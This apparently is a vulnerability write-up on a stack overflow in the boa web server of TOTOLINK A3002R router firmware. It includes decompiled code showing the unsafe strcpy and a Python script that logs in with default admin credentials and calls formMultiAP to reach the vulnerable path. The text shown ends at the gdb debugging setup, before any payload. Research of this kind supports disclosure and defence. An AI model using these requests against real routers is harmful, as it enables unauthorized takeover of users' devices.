<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Firmware Download</h2><a id="user-content-firmware-download" class="anchor" aria-label="Permalink: Firmware Download" href="#firmware-download"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><a href="https://www.totolink.net/data/upload/20230830/ef5a16f4b16ef769081aa29caf78e929.rar" rel="nofollow">https://www.totolink.net/data/upload/20230830/ef5a16f4b16ef769081aa29caf78e929.rar</a></p>
<p dir="auto">git clone <a href="https://github.com/Swind1er/Download">https://github.com/Swind1er/Download</a></p>
</blockquote>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Vulnerability Discovery Process</h2><a id="user-content-vulnerability-discovery-process" class="anchor" aria-label="Permalink: Vulnerability Discovery Process" href="#vulnerability-discovery-process"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">Extracting File System</h3><a id="user-content-extracting-file-system" class="anchor" aria-label="Permalink: Extracting File System" href="#extracting-file-system"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="highlight highlight-source-shell" dir="auto"><pre>unrar x ./A3002R-V4.0.0-B20230531.1404.rar
binwalk --run-as=root -Me TOTOLINK-A3002R-Ge-V4.0.0-B20230531.1404.web</pre></div>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">File System Information</h3><a id="user-content-file-system-information" class="anchor" aria-label="Permalink: File System Information" href="#file-system-information"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="highlight highlight-source-shell" dir="auto"><pre>└─<span class="pl-c"><span class="pl-c">#</span> readelf -h ./bin/busybox</span>
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2<span class="pl-s"><span class="pl-pds">'</span>s complement, little endian</span>
<span class="pl-s">  Version:                           1 (current)</span>
<span class="pl-s">  OS/ABI:                            UNIX - System V</span>
<span class="pl-s">  ABI Version:                       0</span>
<span class="pl-s">  Type:                              EXEC (Executable file)</span>
<span class="pl-s">  Machine:                           MIPS R3000</span>
<span class="pl-s">  Version:                           0x1</span>
<span class="pl-s">└─# checksec ./boa                </span>
<span class="pl-s">[!] Could not populate MIPS GOT: seek out of range</span>
<span class="pl-s">[!] Did not find any GOT entries</span>
<span class="pl-s">[*] <span class="pl-pds">'</span></span>/root/Desktop/share/emb/firmware/exct/A3002R-V4.0.0-B20230531.1404/exp/Download/_TOTOLINK-A3002R-Ge-V4.0.0-B20230531.1404.web.extracted/squashfs-root/bin/boa<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s">    Arch:     mips-32-little</span>
<span class="pl-s">    RELRO:    No RELRO</span>
<span class="pl-s">    Stack:    No canary found</span>
<span class="pl-s">    NX:       NX unknown - GNU_STACK missing</span>
<span class="pl-s">    PIE:      No PIE (0x400000)</span>
<span class="pl-s">    Stack:    Executable</span>
<span class="pl-s">    RWX:      Has RWX segments</span></pre></div>
<p dir="auto">Architecture: <code>MIPS little endian</code></p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">Vulnerability Location</h3><a id="user-content-vulnerability-location" class="anchor" aria-label="Permalink: Vulnerability Location" href="#vulnerability-location"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>File Location</strong></p>
<div class="highlight highlight-source-shell" dir="auto"><pre>_TOTOLINK-A3002R-Ge-V4.0.0-B20230531.1404.web.extracted/squashfs-root/bin/boa</pre></div>
<p dir="auto"><strong>Vulnerable File</strong></p>
<p dir="auto">Using IDA to analyze the <code>boa</code> file, at RVA: 0x00438E84, there is a function responsible for adding WLAN SSID. This function is a sub-function of the CGI handler function <code>formWlEncrypt</code>.</p>
<div class="highlight highlight-source-shell" dir="auto"><pre>int __fastcall setWlan(int a1, int a2, int field_name)
{
  char wlan_name[36]<span class="pl-k">;</span> // [sp+18h] [-38h] BYREF
  char v8[12]<span class="pl-k">;</span> // [sp+3Ch] [-14h] BYREF
  int v9<span class="pl-k">;</span> // [sp+48h] [-8h] BYREF

  <span class="pl-en">apmib_save_wlanIdx</span>();
  sprintf(v8, <span class="pl-s"><span class="pl-pds">"</span>wlan%d-vxd<span class="pl-pds">"</span></span>, a1)<span class="pl-k">;</span>
  writeWlan(v8)<span class="pl-k">;</span>
  apmib_get(1, (int)wlan_name)<span class="pl-k">;</span>
  <span class="pl-k">if</span> ( strcmp(wlan_name, field_name) <span class="pl-k">&amp;&amp;</span> strcmp(field_name, wlan_name) )
  {
    v9 = 1<span class="pl-k">;</span>
    apmib_set(0x110, (int)<span class="pl-k">&amp;</span>v9)<span class="pl-k">;</span>
    strcpy(wlan_name, field_name)<span class="pl-k">;</span>	//<span class="pl-k">&lt;</span>-- Buffer Overflow
    apmib_set(1, (int)wlan_name)<span class="pl-k">;</span>
    apmib_set(0x116, (int)wlan_name)<span class="pl-k">;</span>
    apmib_set(a2, (int)wlan_name)<span class="pl-k">;</span>
  }
  sprintf(v8, <span class="pl-s"><span class="pl-pds">"</span>wlan%d<span class="pl-pds">"</span></span>, a1)<span class="pl-k">;</span>
  writeWlan(v8)<span class="pl-k">;</span>
  <span class="pl-k">return</span> <span class="pl-en">apmib_recov_wlanIdx</span>();
}</pre></div>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">Vulnerability Description</h3><a id="user-content-vulnerability-description" class="anchor" aria-label="Permalink: Vulnerability Description" href="#vulnerability-description"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">In the CGI handler function <code>formWlEncrypt</code> of the web server (boa) in this firmware, the vendor only implemented simple character count control at the web front-end layer for the user-input <code>wlan_ssid</code> field, without enforcing any character count limit at the backend. This leads to a stack overflow due to <code>strcpy(wlan_name, field_name);</code>, subsequently resulting in arbitrary command execution or denial of service attacks. It's important to note that to reach the vulnerability point <code>strcpy</code>, the <code>vwlan_idx</code> field (RVA: 0x48a2a0) needs to be greater than or equal to 5. In the function at RVA <code>0x0043C9E0</code>, as shown in the following figure:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/bc1778d09fc05e17da899298ae6587e9d180b57eced8ad9e4d3bfd319b750cef/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235313433393838372e706e67"><img src="https://camo.githubusercontent.com/bc1778d09fc05e17da899298ae6587e9d180b57eced8ad9e4d3bfd319b750cef/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235313433393838372e706e67" alt="image-20240425143854790" data-canonical-src="https://gitee.com/D_ionysus/cloudimage/raw/master/img/202404251439887.png" style="max-width: 100%;"></a></p>
<p dir="auto">To make the <code>wlan_idx</code> field greater than or equal to five, you can invoke its CGI function <code>formMultiAP</code>, with RVA <code>0x0045984C</code>, as shown below:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6a55167fc8504148f08df9025e358541fd426c34f3b17e6e63f4606e769a9517/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235313434333334372e706e67"><img src="https://camo.githubusercontent.com/6a55167fc8504148f08df9025e358541fd426c34f3b17e6e63f4606e769a9517/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235313434333334372e706e67" alt="image-20240425144336269" data-canonical-src="https://gitee.com/D_ionysus/cloudimage/raw/master/img/202404251443347.png" style="max-width: 100%;"></a></p>
<p dir="auto">To make the <code>wlan_idx</code> field greater than or equal to 5, you need to include fields such as <code>start_wsc</code> and <code>needEnable11kv</code> in the request. Specific validation will be provided below.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">Vulnerability Verification</h3><a id="user-content-vulnerability-verification" class="anchor" aria-label="Permalink: Vulnerability Verification" href="#vulnerability-verification"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Requirements</h4><a id="user-content-requirements" class="anchor" aria-label="Permalink: Requirements" href="#requirements"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<ol dir="auto">
<li>
<p dir="auto">FirmAE github:<a href="https://github.com/pr0v3rbs/FirmAE">https://github.com/pr0v3rbs/FirmAE</a></p>
</li>
<li>
<p dir="auto">gdb-multiarch<code>apt-get install gdb-multiarch</code></p>
</li>
<li>
<p dir="auto">Python version &gt;= 3.8 and install the requests and pwntools libraries. <a href="https://github.com/Gallopsled/pwntools">Gallopsled/pwntools: CTF framework and exploit development library (github.com)</a></p>
<pre><code>pip install requests
sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
</code></pre>
</li>
<li>
<p dir="auto">busybox-mipsel Download here:<a href="https://github.com/Swind1er/Download/">Swind1er/Download (github.com)</a></p>
</li>
<li>
<p dir="auto">netcat <code>sudo apt-get install netcat</code></p>
</li>
</ol>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Verification</h4><a id="user-content-verification" class="anchor" aria-label="Permalink: Verification" href="#verification"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">For ease of validation, the author simulated the router firmware using FirmAE.</p>
<p dir="auto">First, the router firmware is simulated. It takes some time during the initial simulation of the firmware using FirmAE.</p>
<pre><code>./run.sh -d totlink /root/Desktop/firmware/TOTOLINK-A3002R-Ge-V4.0.0-B20230531.1404.web
</code></pre>
<p dir="auto">After the router comes online, we can access its web control page. (In the FirmAE simulation, the IP assigned to this router model is 192.168.0.1, and the default username and password for this router model are both admin.)</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/39d346ddf841e3fc368437ad85092a07029d245211aee81cabb59aea0fb50be2/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235313532383438392e706e67"><img src="https://camo.githubusercontent.com/39d346ddf841e3fc368437ad85092a07029d245211aee81cabb59aea0fb50be2/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235313532383438392e706e67" alt="image-20240425152837402" data-canonical-src="https://gitee.com/D_ionysus/cloudimage/raw/master/img/202404251528489.png" style="max-width: 100%;"></a></p>
<p dir="auto"><strong>formMultiAP</strong></p>
<p dir="auto">First, you need to call the <code>formMultiAP</code> CGI function to increase the value of the <code>wlan_idx</code> field to 5. A simple exploit script is as follows:</p>
<div class="highlight highlight-source-python" dir="auto"><pre><span class="pl-k">import</span> <span class="pl-s1">logging</span>
<span class="pl-k">import</span> <span class="pl-s1">requests</span>

<span class="pl-s1">logging</span>.<span class="pl-c1">basicConfig</span>(<span class="pl-s1">level</span><span class="pl-c1">=</span><span class="pl-s1">logging</span>.<span class="pl-c1">DEBUG</span>)

<span class="pl-s1">sessionId</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>

<span class="pl-k">def</span> <span class="pl-en">invokeFormLogin</span>():
    <span class="pl-k">global</span> <span class="pl-s1">sessionId</span>
    <span class="pl-s1">url</span> <span class="pl-c1">=</span> <span class="pl-s">'http://192.168.0.1/boafrm/formLogin'</span>

    <span class="pl-s1">headers</span> <span class="pl-c1">=</span> {
        <span class="pl-s">'Host'</span>: <span class="pl-s">'192.168.0.1'</span>,
        <span class="pl-s">'User-Agent'</span>: <span class="pl-s">'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'</span>,
        <span class="pl-s">'Accept'</span>: <span class="pl-s">'*/*'</span>,
        <span class="pl-s">'Accept-Language'</span>: <span class="pl-s">'en-US,en;q=0.5'</span>,
        <span class="pl-s">'Accept-Encoding'</span>: <span class="pl-s">'gzip, deflate'</span>,
        <span class="pl-s">'Content-Type'</span>: <span class="pl-s">'application/x-www-form-urlencoded; charset=UTF-8'</span>,
        <span class="pl-s">'X-Requested-With'</span>: <span class="pl-s">'XMLHttpRequest'</span>,
        <span class="pl-s">'Origin'</span>: <span class="pl-s">'http://192.168.0.1'</span>,
        <span class="pl-s">'Connection'</span>: <span class="pl-s">'close'</span>,
    }

    <span class="pl-s1">data</span> <span class="pl-c1">=</span> {
        <span class="pl-s">"topicurl"</span>: <span class="pl-s">"setting/setUserLogin"</span>,
        <span class="pl-s">"username"</span>: <span class="pl-s">"admin"</span>,
        <span class="pl-s">"userpass"</span>: <span class="pl-s">"admin"</span>,
        <span class="pl-s">"submit-url"</span>: <span class="pl-s">"/login.htm"</span>
    }

    <span class="pl-s1">response</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">post</span>(<span class="pl-s1">url</span>, <span class="pl-s1">headers</span><span class="pl-c1">=</span><span class="pl-s1">headers</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">data</span>)

    <span class="pl-s1">logging</span>.<span class="pl-c1">debug</span>(<span class="pl-s">f"sessionId---&gt;<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">response</span>.<span class="pl-c1">text</span><span class="pl-kos">}</span></span>"</span>)
    <span class="pl-s1">sessionId</span> <span class="pl-c1">=</span> <span class="pl-s1">response</span>.<span class="pl-c1">text</span>

<span class="pl-k">def</span> <span class="pl-en">invokeformMultiAP</span>():
    <span class="pl-k">global</span> <span class="pl-s1">sessionId</span>
    <span class="pl-s1">url</span> <span class="pl-c1">=</span> <span class="pl-s">'http://192.168.0.1/boafrm/formMultiAP'</span>

    <span class="pl-s1">headers</span> <span class="pl-c1">=</span> {
        <span class="pl-s">'Host'</span>: <span class="pl-s">'192.168.0.1'</span>,
        <span class="pl-s">'User-Agent'</span>: <span class="pl-s">'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'</span>,
        <span class="pl-s">'Accept'</span>: <span class="pl-s">'*/*'</span>,
        <span class="pl-s">'Accept-Language'</span>: <span class="pl-s">'en-US,en;q=0.5'</span>,
        <span class="pl-s">'Accept-Encoding'</span>: <span class="pl-s">'gzip, deflate'</span>,
        <span class="pl-s">'Content-Type'</span>: <span class="pl-s">'application/x-www-form-urlencoded; charset=UTF-8'</span>,
        <span class="pl-s">'X-Requested-With'</span>: <span class="pl-s">'XMLHttpRequest'</span>,
        <span class="pl-s">'Origin'</span>: <span class="pl-s">'http://192.168.0.1'</span>,
        <span class="pl-s">'Connection'</span>: <span class="pl-s">'close'</span>,
        <span class="pl-s">'Referer'</span>: <span class="pl-s">'http://192.168.0.1/wlsecurity.htm'</span>
    }

    <span class="pl-s1">data</span> <span class="pl-c1">=</span> {
        <span class="pl-s">'sessionCheck'</span>: <span class="pl-s1">sessionId</span>,
        <span class="pl-s">'submit-url'</span>: <span class="pl-s">'/wlsecurity.htm'</span>,
        <span class="pl-s">'start_wsc'</span>: <span class="pl-s">''</span>,
        <span class="pl-s">'needEnable11kv'</span>: <span class="pl-s">'1'</span>,
        <span class="pl-s">'save_apply'</span>: <span class="pl-s">'1'</span>
    }

    <span class="pl-s1">response</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">post</span>(<span class="pl-s1">url</span>, <span class="pl-s1">headers</span><span class="pl-c1">=</span><span class="pl-s1">headers</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">data</span>)

    <span class="pl-k">if</span> <span class="pl-s1">response</span>.<span class="pl-c1">status_code</span> <span class="pl-c1">!=</span> <span class="pl-c1">200</span>:
        <span class="pl-k">assert</span> <span class="pl-s">f'Failed to add wlan_idx. Status_code: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">response</span>.<span class="pl-c1">status_code</span><span class="pl-kos">}</span></span>'</span>
    <span class="pl-s1">logging</span>.<span class="pl-c1">info</span>(<span class="pl-s">'Successfully added wlan_idx.'</span>)

<span class="pl-k">def</span> <span class="pl-en">main</span>():
    <span class="pl-en">invokeFormLogin</span>()
    <span class="pl-en">invokeformMultiAP</span>()
<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">'__main__'</span>:
    <span class="pl-en">main</span>()</pre></div>
<p dir="auto">In the function <code>formMultiAP</code> (RVA: <code>0x0045984C</code>), as shown in the figure below:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/068ca981452ac493770472c5fe703c75f7eb189c04597e8e88b6852bcffd4c8e/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235313533383636312e706e67"><img src="https://camo.githubusercontent.com/068ca981452ac493770472c5fe703c75f7eb189c04597e8e88b6852bcffd4c8e/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235313533383636312e706e67" alt="image-20240425153826589" data-canonical-src="https://gitee.com/D_ionysus/cloudimage/raw/master/img/202404251538661.png" style="max-width: 100%;"></a></p>
<p dir="auto">The <code>sessionCheck</code> in the <code>invokeformMultiAP</code> function within the script is used for user authentication through <code>boa</code>. The <code>start_wsc</code>, <code>needEnable11kv</code>, and <code>save_apply</code> fields specify particular program execution flows to increase the <code>wlan_idx</code> field to 5.</p>
<p dir="auto">First, attach <code>boa</code> using the gdbserver provided by FirmAE.</p>
<div class="highlight highlight-source-shell" dir="auto"><pre>------------------------------
<span class="pl-k">|</span>       FirmAE Debugger      <span class="pl-k">|</span>
------------------------------
1. connect to socat
2. connect to shell
3. tcpdump
4. run gdbserver
5. file transfer
6. <span class="pl-c1">exit</span>
<span class="pl-k">&gt;</span> 2
Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is <span class="pl-s"><span class="pl-pds">'</span>^]<span class="pl-pds">'</span></span>.

<span class="pl-k">~</span> <span class="pl-c"><span class="pl-c">#</span> ps | grep boa</span>
  659 root      4480 S    boa 
 3606 root      4208 S    /bin/boa 
21333 root      1080 S    grep boa 
<span class="pl-k">~</span> <span class="pl-c"><span class="pl-c">#</span> /firmadyne/gdbserver 192.168.0.1:1337 --attach 659</span>
Attached<span class="pl-k">;</span> pid = 659
Listening on port 1337</pre></div>
<p dir="auto">On the host machine, use gdb-multiarch for debugging.</p>
<pre><code>gdb-multiarch -x ./mipsel.cmd
</code></pre>
<p dir="auto">The contents of <code>mipsel.cmd</code> are as follows:</p>
<div class="highlight highlight-source-shell" dir="auto"><pre><span class="pl-c1">set</span> architecture mips
<span class="pl-c1">set</span> endian little

<span class="pl-c1">set</span> follow-fork-mode parent
b <span class="pl-k">*</span>0x00459FD4

b <span class="pl-k">*</span>0x00438F5C
b <span class="pl-k">*</span>0x00438F6C 
target remote 192.168.0.1:1337</pre></div>
<p dir="auto">At the address 0x00459FD4, which marks the end of the <code>formMultiAP</code> function, set a breakpoint to conveniently observe the value of <code>wlan_idx</code>.</p>
<p dir="auto">First, access the web control page in the browser at <code>192.168.0.1</code> and log in. [Important!]</p>
<p dir="auto">Before sending the request, let's first check the value of <code>wlan_idx</code>, as shown in the following figure:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6302e024c7b514adb9b6872e4591af66b045da2075f6743acc28d59aa9eb7b2d/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235313935353439312e706e67"><img src="https://camo.githubusercontent.com/6302e024c7b514adb9b6872e4591af66b045da2075f6743acc28d59aa9eb7b2d/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235313935353439312e706e67" alt="image-20240425195524427" data-canonical-src="https://gitee.com/D_ionysus/cloudimage/raw/master/img/202404251955491.png" style="max-width: 100%;"></a></p>
<p dir="auto">You can see that the current value of <code>wlan_idx</code> is 0. Run the script:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/51e6f137c5583ab8a8799af3043d8623aebeaba8c1ae1815c94c836312c664fd/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235313935353733372e706e67"><img src="https://camo.githubusercontent.com/51e6f137c5583ab8a8799af3043d8623aebeaba8c1ae1815c94c836312c664fd/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235313935353733372e706e67" alt="image-20240425195555667" data-canonical-src="https://gitee.com/D_ionysus/cloudimage/raw/master/img/202404251955737.png" style="max-width: 100%;"></a></p>
<p dir="auto">As shown below, you can see that the value of <code>wlan_idx</code> is 5:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a82705e0dc2cb25eef7c92b6e4af0a8ba8f0a24bfac89c32b6733311cb683c2b/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235313935363037372e706e67"><img src="https://camo.githubusercontent.com/a82705e0dc2cb25eef7c92b6e4af0a8ba8f0a24bfac89c32b6733311cb683c2b/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430343235313935363037372e706e67" alt="image-20240425195620010" data-canonical-src="https://gitee.com/D_ionysus/cloudimage/raw/master/img/202404251956077.png" style="max-width: 100%;"></a></p>
